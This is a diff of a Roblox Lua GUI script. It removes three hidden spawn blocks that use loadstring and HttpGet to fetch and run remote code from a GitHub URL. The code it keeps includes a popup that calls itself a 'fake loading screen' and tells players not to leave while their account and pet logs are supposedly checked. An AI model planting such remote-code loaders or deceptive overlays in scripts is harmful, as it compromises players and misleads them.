@@ -87,9 +87,6 @@ helpButton.Font = Enum.Font.SourceSansBold
 helpButton.TextScaled = true
 helpButton.ZIndex = 10
 helpButton.Parent = blackBG
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
-end)
 Instance.new("UICorner", helpButton).CornerRadius = UDim.new(0, 6)
 
 -- Help Popup
@@ -111,9 +108,6 @@ helpText.TextColor3 = Color3.new(1, 1, 1)
 helpText.Font = Enum.Font.SourceSans
 helpText.TextScaled = true
 helpText.TextWrapped = true
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
-end)
 helpText.Text = "Fake loading screen. Please do not leave. System is validating account, reading pet logs, and checking server assignments."
 helpText.Parent = helpPopup
 
@@ -175,9 +169,6 @@ spawn(function()
         idx = idx % #messages + 1
         wait(30)
     end
-end)
-spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
 end)
 
 spawn(function()
